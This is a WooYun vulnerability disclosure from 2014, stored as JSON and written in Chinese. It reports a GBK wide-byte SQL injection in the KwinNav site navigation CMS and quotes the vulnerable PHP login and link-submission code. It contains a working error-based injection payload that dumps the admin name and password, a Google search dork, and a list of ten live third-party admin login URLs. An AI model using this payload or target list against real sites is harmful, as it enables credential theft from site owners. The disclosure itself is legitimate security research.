{"id": 43602, "wybug_id": "wooyun-2014-082272", "wybug_title": "KwinNav 宽字符注入(demo成功)", "wybug_corp": "KwinNav", "wybug_author": "宇少", "wybug_date": "2014-11-07 19:02", "wybug_open_date": "2015-02-05 19:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 早上去菜场买菜，有个大叔在菜场门口摆了六七根山药坐在矮凳上叫卖，我问大叔这山药吃了补肾吗？他说：当然补了，男人吃了，女人受不了！女人吃了，男人受不了！男女都吃了，床受不了！我乐了，笑问：这么好的东西，您咋不多种点？答：种多了，地受不了！ 详细说明：  google关键词：Powered by KwinNav你们说要提供5个以上非demo实列子 那好随便找了10个案例演示\nhttp://www.3m4.net/admin/login.phphttp://yulin.0912007.com/admin/login.phphttp://www.cwen.org/114//admin/login.phphttp://www.puerquan.com/daohang//admin/login.phphttp://www.dm566.com//admin/login.phphttp://95880.net//admin/login.phphttp://hao.56lem.com/admin/login.phphttp://daoh.22web.org/admin/login.phphttp://www.114diy.cn/admin/login.phphttp://56114.com.cn/admin/login.php\n#1 admin/login.php 1-27行\n<?phpset_time_limit ( 0 );define ( 'ROOT' , str_replace(\"\\\\\",\"/\",dirname(dirname($_SERVER['SCRIPT_FILENAME'])).'/' ));define ( 'PANEL_ROOT' , str_replace(\"\\\\\",\"/\",dirname(__FILE__)).'/' );include_once(ROOT.'include/debug.php');require_once(ROOT.'include/smarty_inc.php');require_once(ROOT.'include/mysql_inc.php');require_once(ROOT.'include/config_inc.php');$templates->assign(\"version\",$version);$templates->assign(\"full_version\",$full_version);$templates->assign(\"build_version\",$build_version);$templates->assign(\"public_time\",$public_time);$type = _T(@$_GET['type']);if(empty($type)){\t$templates->display( PANEL_ROOT.'templates/login.tpl' );}elseif($type=='login'){\t$db = new db_mysql( $dbhost, $dbuser, $dbpwd, $dbname);\t$username = _T(@$_POST['username']);\t$password = _T(@$_POST['password']);\t$user = $db->select(\"SELECT * FROM `{$dbprefix}_admin` WHERE `Name` = '{$username}'\");\n我们跟踪下_Tinclude\\mysql_inc.php 199-207\nfunction _T($str)     {     \tif (!get_magic_quotes_gpc())\t{     \t\t$str = addslashes($str);\t}     \treturn $str;}?>\n如果gpc没开就转义看似已经不能注入了但是这里数据库编码字符设置是gbk 那么我们可以利用宽字符来注入%df %aa另外一个地方依然出现同样的问题common\\linkin.php 1-40行\n<?phpsession_start( );set_time_limit ( 0 );define ( 'ROOT' , str_replace(\"\\\\\",\"/\",dirname(dirname($_SERVER['SCRIPT_FILENAME'])).'/' ));include_once(ROOT.'include/debug.php');require_once(ROOT.'/include/config_inc.php');require_once(ROOT.'/include/smarty_inc.php');require_once(ROOT.'/include/mysql_inc.php');$db = new db_mysql( $dbhost, $dbuser, $dbpwd, $dbname);$type = _T(@$_GET['type']);if(empty($type)){  $templates->assign(\"sites\", $sites);  $templates->display(ROOT.\"common/linkin.tpl\");}else{  $Name = _T($_POST['Name']);  $Link = _T($_POST['Link']);  $Describe = _T($_POST['Describe']);  if (empty($Name)||empty($Link)||empty($Describe))  {\techo \"<script language=\\\"javascript\\\" type=\\\"text/javascript\\\">\\n\";\techo \"<!--\\n\";\techo \"alert (\\\"请将表单填写完整\\\");\\n\";\techo \"window.history.go(-1);\\n\";\techo \"-->\\n\";\techo \"</script>\\n\";\texit();  }  $ip = getenv(\"REMOTE_ADDR\");  $db->query(\"INSERT INTO `\".$dbprefix.\"_linkin` VALUES ('0' , '{$Name}', '{$Link}', NOW( ) , '{$ip}', '{$Describe}');\");  echo \"<script language=\\\"javascript\\\" type=\\\"text/javascript\\\">\\n\";  echo \"<!--\\n\";  echo \"alert (\\\"申请成功，我们会尽快处理。\\\");\\n\";  echo \"window.history.go(-1);\\n\";  echo \"-->\\n\";  echo \"</script>\\n\";}?>\n   漏洞证明：  好了，废话不多说直接注入演示官方demo\n\n构造exp：\npassword=acUn3t1x&Submit=Submit&username=%df%27 AND (SELECT 1 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(Name,0x23,PassWord) FROM kw_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b)#\n有图有真相思密达\n\n   修复方案：  mysql字符集转换来20个rank 我要升级普通白帽子！   版权声明：转载请注明来源 宇少@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-11-07 19:09 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  羡慕。。。php学的很快嘛    \n     2014-11-07 20:39 |    \t\t宇少 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        | Jyhack-TeaM：bbs.jyhack.com 群:308694453...)\t\t \n  @泳少 带我装B 带我飞    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}